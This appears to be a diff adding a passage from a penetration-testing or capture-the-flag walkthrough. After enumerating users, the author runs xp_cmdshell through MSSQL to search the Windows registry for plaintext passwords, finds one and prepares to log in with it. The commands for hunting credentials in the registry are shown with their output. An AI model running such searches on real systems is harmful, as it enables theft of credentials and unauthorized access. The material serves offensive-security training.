@@ -1,0 +1,26 @@
+Now that we have discovered usernames using net users command, let’s start searching for low-hanging fruit before we try anything more complicated. We’ll begin by searching for plaintext passwords. We run a few filesystem searches, but don’t find anything useful. Let’s instead search the registry. We’ll begin with a simple search for pass.
+
+reg query HKLM /f pass /t REG_SZ /s
+1> xp_cmdshell 'reg query HKLM /f pass /t REG_SZ /s';
+2> go
+output: NULL
+ 
+output: HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}
+ 
+output:     (Default)    REG_SZ    Picture Password Enrollment UX
+
+...
+
+output: NULL
+ 
+output: HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control
+ 
+output:     CurrentPass    REG_SZ    thisispassword
+ 
+output: NULL
+
+...
+Sifting through the data, we find what looks like a plaintext password. Let’s attempt to authenticate with this password.
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
